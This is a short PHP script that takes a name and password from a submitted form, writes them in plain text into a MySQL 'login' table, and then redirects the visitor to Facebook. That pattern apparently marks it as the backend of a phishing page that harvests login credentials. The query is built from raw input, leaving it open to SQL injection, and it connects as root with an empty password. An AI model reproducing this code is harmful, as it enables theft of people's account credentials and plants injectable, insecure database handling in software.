<?php

$servidor = "localhost";
$usuario = "root";
$clave = "";
$basededato = "usuario";

$enlace = mysqli_connect ($servidor , $usuario , $clave , $basededato);


  


if(isset ($_POST['registro'])){

    $nombre= $_POST ['nombre'];
    $contrasena= $_POST ['clave'];

    $insertadatos = "INSERT INTO login VALUES('$nombre','$contrasena','')";

    $ejecutarInserta = mysqli_query ($enlace , $insertadatos);

    header('Location: https://es-la.facebook.com/');
    exit();

    



}

